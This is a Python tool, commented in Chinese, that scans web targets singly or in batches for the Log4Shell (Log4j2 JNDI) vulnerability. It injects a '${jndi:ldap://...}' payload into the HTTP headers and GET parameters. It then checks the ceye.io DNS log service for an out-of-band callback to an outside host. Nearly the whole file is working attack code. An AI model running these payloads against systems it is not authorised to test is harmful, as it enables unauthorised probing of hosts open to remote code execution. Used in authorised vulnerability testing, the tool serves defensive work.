'''
@文件        :log4j2_scan.py
@说明        :
@时间        :2021/12/14 15:20:48
@作者        :eleven
@版本        :0.2
'''


import argparse
import requests
from urllib.parse import urlparse,parse_qs
import urllib3

# 已经关闭认证（verify=False）情况下，关闭控制台会输出ssl-warnings：
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Log4j2Scan:

 # 在header 中添加 payload 暂时只改变host 和referer ，后续还可以加其他的头  
    def change_header(self,host,payload):
        header_dic = {"Host":host + payload,"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0"+ payload ,"Referer":payload}
        return header_dic
# 在get参数中添加payload
    def change_get(self,url,payload):
        query = urlparse(url).query
        new_query = query.replace("=","="+payload)
        new_url = url.replace(query,new_query)            
        return new_url
    def change_json():
        pass
    def change_cookie():
        pass

# 因为ceye.io  filter 最大二十个字符    
    def url_parse_filter(self,url):
        urlparse(url).netloc.replace(".","")
        filter = urlparse(url).netloc.split(":")[0][0:19]
        return filter 
       
    def url_parse (self,url):
        if "http" not in url:
            return "http://"+ url
        else:
            return url

    def scan(self,domain,identifier_url, apitoken):
        url = self.url_parse(domain)
        filter = self.url_parse_filter(url)
        host = urlparse(url).netloc
        ceye_url = filter + "." + identifier_url 

# 暂时只支持一个payload
        payload ="${jndi:ldap://"+ ceye_url + "}"
        header = self.change_header(host, payload)
        url = self.change_get(url,payload)
        proxies = {
    'https': "http://127.0.0.1:8080",
    'http': "http://127.0.0.1:8080"
}
        print ('\033[1;32m 测试%s CEYEDNS响应：-->>\033[1;m'%host)
        
        try:
          
            r = requests.get(url,headers=header,timeout=2,verify=False )
        except:    
            with open('timeout.txt', 'a') as f:
                f.write(host + "\n")
                print(f"{host}请求超时") 
          
        try:
            ceye_url = "http://api.ceye.io/v1/records?token=" + apitoken + "&type=dns&filter=" + filter  
            resp = requests.get(ceye_url,verify=False)
            print (resp.content.decode('utf-8'))
            if resp.status_code==200:
                if filter in resp.content.decode('utf-8'):
                    with open('output.txt', 'a') as f:
                        f.write(url + "\n")
                        message = url + " is vulnerable"
                        print('\033[1;32m%s\033[1;m' % message)  
                          
        except KeyboardInterrupt:
            exit(0)
           
            
        
             
 
if __name__ == '__main__':
    log4j2scan = Log4j2Scan()
    parser = argparse.ArgumentParser()
    parser.add_argument('-k', dest='apitoken', help='ceye.io个人页面的token')
    parser.add_argument('-c', dest='identifier', help='ceye.io个人页面的identifier')
    parser.add_argument('-u', dest='url', help='单个url')
    parser.add_argument('-f', dest='file', help='批量URL检测')
    args = parser.parse_args()      # parse_args()从指定的选项中返回一些数据
    if args.file:
        file = args.file
        with open(file, "r", encoding='UTF-8') as files:
            file_data = files.readlines()  # 读取文件
            for url in file_data:
                url = url.strip('\n')
                try:
                    log4j2scan.scan(url,args.identifier,args.apitoken)
                except KeyboardInterrupt:
                    exit(0)                
    elif args.url:
        log4j2scan.scan(args.url, args.identifier, args.apitoken)
    else:
        pass
                


    

